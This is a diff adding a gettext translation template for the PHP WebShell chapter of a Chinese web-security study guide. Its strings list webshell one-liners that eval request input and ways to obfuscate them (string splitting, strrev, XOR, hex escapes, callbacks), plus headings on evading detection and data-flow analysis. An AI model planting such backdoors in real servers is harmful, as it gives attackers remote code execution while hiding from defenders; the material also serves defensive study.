@@ -1,0 +1,408 @@
+# SOME DESCRIPTIVE TITLE.
+# Copyright (C) 2019-2026, Lyle
+# This file is distributed under the same license as the Web安全学习笔记 package.
+# FIRST AUTHOR <EMAIL@ADDRESS>, 2026.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Report-Msgid-Bugs-To: \n"
+"POT-Creation-Date: 2026-06-17 07:02+0800\n"
+"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
+"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
+"Language: en\n"
+"Language-Team: en <LL@li.org>\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=utf-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Generated-By: Babel 2.18.0\n"
+
+#: ../../source/language/php/webshell.rst:2
+msgid "WebShell"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:5
+msgid "常见变形"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:6
+msgid "GLOBALS"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:7
+msgid "``eval($GLOBALS['_POST']['op']);``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:8
+msgid "``$_FILE``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:9
+msgid "``eval($_FILE['name']);``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:10
+msgid "拆分"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:11
+#, python-brace-format
+msgid "``eval(${\"_PO\".\"ST\"} ['sz']);``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:12
+msgid "动态函数执行"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:13
+#, python-brace-format
+msgid "``$k=\"ass\".\"ert\"; $k(${\"_PO\".\"ST\"} ['sz']);``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:14
+msgid "``$a=$_GET['a'];$a($_GET['b']);``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:15
+msgid "create_function"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:16
+msgid ""
+"``$function = "
+"create_function('$code',strrev('lave').'('.strrev('TEG_$').'[\"code\"]);');$function();``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:17
+msgid "preg_replace"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:18
+msgid "变形"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:19
+msgid "str_replace(\" \", \"e v a l\")"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:20
+msgid "进制转化"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:21
+msgid "``\"\\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145\"``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:22
+msgid "进制运算"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:23
+msgid "``(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\");``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:24
+msgid "自增运算"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:25
+msgid "``$a=\"a\";$a++;``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:26
+msgid "强制类型转换"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:27
+msgid "``$a='';$a.=[]; // Array``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:28
+msgid "利用文件名"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:29
+msgid "``__FILE__``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:30
+msgid "注释"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:31
+msgid "``$a=\"e\".\"v\"./*-/*-*/\"a\"./*-*/\"l\";``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:32
+msgid "反射"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:33
+msgid "``ReflectionFunction``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:36
+msgid "Bypass"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:37
+msgid "基于少见函数"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:38
+msgid "``mb_eregi_replace('.*',$_GET[1],'','e');``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:39
+msgid "set_error_handler + trigger_error"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:40
+msgid "基于污染传播"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:41
+msgid "``putenv($_GET[\"c\"]);eval(getenv('path'));``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:42
+msgid "parse_str"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:43
+msgid "parse_url"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:44
+msgid "extract"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:45
+msgid "token_get_all"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:46
+msgid "define"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:47
+msgid "基于少见源"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:48
+msgid "``$a = filter_input(INPUT_GET,'c');``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:49
+msgid "``eval(end(getallheaders()));``"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:50
+msgid "get_defined_vars"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:51
+msgid "getallheaders"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:52
+msgid "get_meta_tags"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:53
+msgid "phpinfo"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:54
+msgid "外部变量 / 文件信息"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:55
+msgid "重载 toString"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:58
+msgid "字符串变形函数"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:59
+msgid "base64_decode"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:60
+msgid "base64_encode"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:61
+msgid "str_replace"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:62
+msgid "str_rot13"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:63
+msgid "strtok"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:64
+msgid "strtolower"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:65
+msgid "strtoupper"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:66
+msgid "strtr"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:67
+msgid "substr"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:68
+msgid "substr_replace"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:69
+msgid "trim"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:70
+msgid "ucfirst"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:71
+msgid "ucwords"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:74
+msgid "回调函数"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:75
+msgid "array_filter"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:76
+msgid "array_map"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:77
+msgid "array_reduce"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:78
+#: ../../source/language/php/webshell.rst:79
+msgid "array_walk"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:80
+msgid "array_walk_recursive"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:81
+msgid "call_user_func"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:82
+msgid "call_user_func_array"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:83
+msgid "filter_var"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:84
+msgid "filter_var_array"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:85
+msgid "preg_replace_callback"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:86
+msgid "register_tick_function"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:87
+msgid "registregister_shutdown_function"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:88
+msgid "uasort"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:89
+msgid "uksort"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:92
+msgid "加解密函数"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:93
+msgid "mcrypt_encrypt"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:94
+msgid "openssl_encrypt"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:97
+msgid "其他执行方式"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:98
+msgid "FFI"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:99
+msgid "SimpleXML"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:100
+msgid "SimpleXMLElement"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:103
+msgid "自定义函数"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:104
+msgid "使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:119
+msgid "特殊字符Shell"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:120
+msgid "PHP的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成Shell。"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:170
+msgid "检测对抗"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:171
+msgid "基于混淆影响程序分析"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:172
+msgid "基于动态变量影响程序执行"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:173
+msgid "抛出异常打断数据流分析"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:174
+msgid "基于反射打断数据流分析"
+msgstr ""
+
+#: ../../source/language/php/webshell.rst:175
+msgid "基于引用传递打断数据流分析"
+msgstr ""
